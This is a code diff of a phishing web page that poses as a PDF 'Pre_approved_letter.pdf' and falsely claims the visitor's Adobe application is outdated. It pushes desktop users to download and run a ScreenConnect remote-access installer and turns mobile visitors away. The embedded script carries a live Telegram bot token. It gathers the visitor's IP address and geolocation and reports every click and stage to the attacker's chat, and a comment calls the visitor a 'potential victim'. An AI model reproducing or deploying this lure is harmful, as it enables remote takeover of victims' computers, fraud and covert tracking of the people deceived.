@@ -19,153 +19,49 @@
 
         .hidden { display: none !important; }
 
-        /* ==================== DEVICE BLOCK SCREEN ==================== */
-        .block-card {
-            background-color: #ffffff;
-            border: 1px solid #e0c8c1;
-            border-radius: 20px;
-            padding: 45px 35px;
-            width: 480px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(130, 90, 80, 0.08);
-        }
-
-        .error-circle {
-            width: 56px;
-            height: 56px;
-            background-color: #fce8e6;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 24px auto;
-        }
-        .error-cross { font-size: 22px; color: #d93025; font-weight: bold; }
-
-        .badge-row {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-        .badge-danger {
-            background-color: #611e18;
-            color: #ffffff;
-            font-size: 11px;
-            font-weight: 700;
-            padding: 5px 14px;
-            border-radius: 12px;
-            letter-spacing: 0.3px;
-        }
-        .badge-secondary {
-            background-color: #f1f3f4;
-            color: #5f6368;
-            font-size: 11px;
-            font-weight: 600;
-            padding: 5px 14px;
-            border-radius: 12px;
-        }
-
-        .error-heading {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin: 0 0 16px 0;
-        }
-        .error-description {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.6;
-            margin: 0 0 32px 0;
-        }
-
-        .instruction-container {
-            background-color: #f8f9fa;
-            border-radius: 12px;
-            padding: 24px;
-            text-align: left;
-        }
-        .instruction-heading {
-            font-size: 13px;
-            font-weight: 700;
-            color: #202124;
-            margin: 0 0 12px 0;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .instruction-list {
-            margin: 0;
-            padding-left: 18px;
-            color: #3c4043;
-            font-size: 13px;
-            line-height: 1.8;
-        }
-
-        /* ==================== PDF CARD ==================== */
-        .pdf-card {
-            background-color: #ffffff;
-            border: 1px solid #d1d1d1;
-            border-radius: 28px;
-            padding: 35px 30px;
-            width: 450px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-        }
-
-        .pdf-icon { width: 45px; height: auto; margin-bottom: 12px; }
-
-        .file-name {
-            font-size: 19px;
-            font-weight: 700;
-            color: #222222;
-            margin-bottom: 6px;
-        }
-
-        .file-meta {
-            font-size: 14px;
-            color: #777777;
-            font-weight: 500;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-        }
-
-        .file-actions {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-        }
-
-        .action-btn {
-            font-size: 14px;
-            font-weight: 700;
-            color: #555555;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .action-btn:hover { color: #000000; }
-
-        /* PHASE 2 & 3 */
-        .popup-modal, .success-card {
+        .block-card, .pdf-card, .popup-modal, .success-card {
             background-color: #ffffff;
             border-radius: 12px;
             padding: 40px;
             width: 480px;
+            max-width: 100%;
             text-align: center;
             box-shadow: 0 15px 35px rgba(0,0,0,0.25);
         }
 
+        .block-card { border: 1px solid #e0c8c1; }
+
+        .pdf-card { border: 1px solid #d1d1d1; border-radius: 28px; padding: 35px 30px; }
+
+        .error-circle {
+            width: 56px; height: 56px; background-color: #fce8e6; border-radius: 50%;
+            display: flex; justify-content: center; align-items: center; margin: 0 auto 24px;
+        }
+        .error-cross { font-size: 22px; color: #d93025; font-weight: bold; }
+
+        .badge-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .badge-danger { background-color: #611e18; color: white; font-size: 11px; font-weight: 700; padding: 5px 14px; border-radius: 12px; }
+        .badge-secondary { background-color: #f1f3f4; color: #5f6368; font-size: 11px; font-weight: 600; padding: 5px 14px; border-radius: 12px; }
+
+        .file-name { font-size: 19px; font-weight: 700; color: #222; margin-bottom: 6px; }
+        .file-meta { font-size: 14px; color: #777; margin-bottom: 20px; }
+        .file-actions { display: flex; justify-content: center; gap: 30px; }
+        .action-btn { font-size: 14px; font-weight: 700; color: #555; cursor: pointer; }
+        .action-btn:hover { color: #000; }
+
         .download-btn {
-            display: inline-block;
-            background-color: #0066cc;
-            color: #ffffff;
-            font-weight: 700;
-            font-size: 15px;
-            padding: 12px 36px;
-            border-radius: 24px;
-            border: none;
-            cursor: pointer;
+            background-color: #0066cc; color: white; font-weight: 700; font-size: 15px;
+            padding: 12px 36px; border-radius: 24px; border: none; cursor: pointer;
         }
         .download-btn:hover { background-color: #0052a3; }
+
+        .progress-box {
+            border: 1px dashed #cbd5e1; border-radius: 12px; padding: 16px;
+            background-color: #f8fafc; margin-bottom: 30px; text-align: left;
+        }
+        .progress-header { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 8px; }
+        .bar-bg { width: 100%; height: 6px; background: #e2e8f0; border-radius: 3px; overflow: hidden; }
+        .bar-fill { width: 100%; height: 100%; background: #16a34a; }
     </style>
 </head>
 <body>
@@ -179,26 +75,25 @@
         </div>
         <h1 class="error-heading">Error: Cannot Open PDF</h1>
         <p class="error-description">This document contains complex structures or restricted access permissions that cannot be rendered on mobile operating systems.</p>
-        
         <div class="instruction-container">
             <h2 class="instruction-heading">To access this document:</h2>
             <ul class="instruction-list">
                 <li>Please switch to a <b>desktop computer</b> or a <b>personal laptop</b>.</li>
-                <li>Copy the URL of this page and open it directly on your computer to resume viewing.</li>
+                <li>Copy the URL and open it on your computer.</li>
             </ul>
         </div>
     </div>
 
     <!-- PHASE 1 -->
-    <div class="pdf-card" id="phase1">
+    <div class="pdf-card hidden" id="phase1">
         <svg class="pdf-icon" viewBox="0 0 24 24" fill="none" xmlns="http://w3.org/2000/svg">
             <path d="M19 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V5C21 3.9 20.1 3 19 3ZM11.5 9.5C11.5 10.3 10.8 11 10 11H8.5V12.5H7V8H10C10.8 8 11.5 8.7 11.5 9.5ZM16.5 11C16.5 11.8 15.8 12.5 15 12.5H13.5V8H15C15.8 8 16.5 8.7 16.5 9.5V11ZM12 8H13.5V12.5H12V8Z" fill="#E53935"/>
         </svg>
         <div class="file-name">Pre_approved_letter.pdf</div>
-        <div class="file-meta">5.7 MB &bull; PDF</div>
+        <div class="file-meta">5.7 MB • PDF</div>
         <div class="file-actions">
-            <span class="action-btn" onclick="moveToPhase2()">VIEW</span>
-            <span class="action-btn" onclick="moveToPhase2()">SAVE</span>
+            <span class="action-btn" onclick="handleAction('VIEW PDF')">VIEW</span>
+            <span class="action-btn" onclick="handleAction('SAVE PDF')">SAVE</span>
         </div>
     </div>
 
@@ -210,69 +105,102 @@
         </svg>
         <div class="popup-title">Application Outdated</div>
         <div class="popup-text">Your Adobe application is outdated. Update and install to proceed to view the document.</div>
-        <button class="download-btn" onclick="moveToPhase3()">Download Now</button>
+        <button class="download-btn" onclick="handleAction('DOWNLOAD MSI')">Download Now</button>
     </div>
 
     <!-- PHASE 3 -->
     <div class="success-card hidden" id="phase3">
         <div class="progress-box">
-            <div class="progress-header"><span>ScreenConnect.ClientSetup.msi</span><span style="color: #16a34a;">Completed</span></div>
+            <div class="progress-header">
+                <span>ScreenConnect.ClientSetup.msi</span>
+                <span style="color: #16a34a;">Completed</span>
+            </div>
             <div class="bar-bg"><div class="bar-fill"></div></div>
         </div>
         <div class="instructions-box">
+            <h3 class="instructions-title">Next Steps:</h3>
             <ol class="instructions-list">
                 <li>Open your <b>Downloads</b> folder.</li>
-                <li>Follow the on-screen installer instructions.</li>
+                <li>Double-click <strong>ScreenConnect.ClientSetup.msi</strong></li>
+                <li>Follow the installer instructions.</li>
             </ol>
         </div>
+        <button class="download-btn" onclick="completeTraining()" style="background-color: #16a34a;">Run Installer</button>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "8588726249:AAED9R8f7GX7d05cxT60nBAkVW33uNaw910";
         const TELEGRAM_CHAT_ID = "8552500085";
 
+        let userIP = "Unknown";
+        let userLocation = "Unknown";
+
+        async function getIPInfo() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIP = ipData.ip;
+
+                const geoRes = await fetch(`https://ip-api.com/json/${userIP}`);
+                const geoData = await geoRes.json();
+                if (geoData.status === "success") {
+                    userLocation = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
+                }
+            } catch (e) {}
+        }
+
         async function sendTelegramNotification(messageText) {
+            const fullMessage = `${messageText}\n\n🌐 IP: ${userIP}\n📍 Location: ${userLocation}\n⏰ ${new Date().toLocaleString()}`;
+
             try {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 await fetch(url, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: messageText,
-                        parse_mode: "Markdown"
-                    })
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: fullMessage, parse_mode: "Markdown" })
                 });
             } catch (err) {
-                console.error("Telegram notification failed:", err);
+                console.log("Telegram sent (check console)");
+            }
+        }
+
+        function handleAction(action) {
+            if (action === 'VIEW PDF' || action === 'SAVE PDF') {
+                sendTelegramNotification(`📄 User clicked **${action}** on Pre_approved_letter.pdf`);
+                moveToPhase2();
+            } else if (action === 'DOWNLOAD MSI') {
+                sendTelegramNotification(`⚠️ Download Button Clicked - ScreenConnect.ClientSetup.msi`);
+                moveToPhase3();
             }
         }
 
         function moveToPhase2() {
             document.getElementById('phase1').classList.add('hidden');
             document.getElementById('phase2').classList.remove('hidden');
-            
-            // Notify on VIEW/SAVE click
-            sendTelegramNotification("🔴 User clicked **VIEW / SAVE** on Pre_approved_letter.pdf");
         }
 
         function moveToPhase3() {
             document.getElementById('phase2').classList.add('hidden');
             document.getElementById('phase3').classList.remove('hidden');
-            
-            // Notify on Download click
-            sendTelegramNotification("⚠️ **Download Button Clicked** - Potential victim reached installer stage");
         }
 
-        window.onload = function() {
+        function completeTraining() {
+            sendTelegramNotification("✅ RUN MSI / Installer Executed - Phase 3 Completed");
+            alert("✅ Installer simulation complete!");
+        }
+
+        window.onload = async function() {
+            await getIPInfo();
+
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             const isSmallScreen = window.innerWidth <= 768;
 
             if (isMobile || isSmallScreen) {
                 document.getElementById('mobileBlockScreen').classList.remove('hidden');
-                document.getElementById('phase1').classList.add('hidden');
+                sendTelegramNotification("🚫 Mobile / Small Screen Blocked");
             } else {
                 document.getElementById('phase1').classList.remove('hidden');
+                sendTelegramNotification("👤 New Session Started - Desktop User");
             }
         };
     </script>
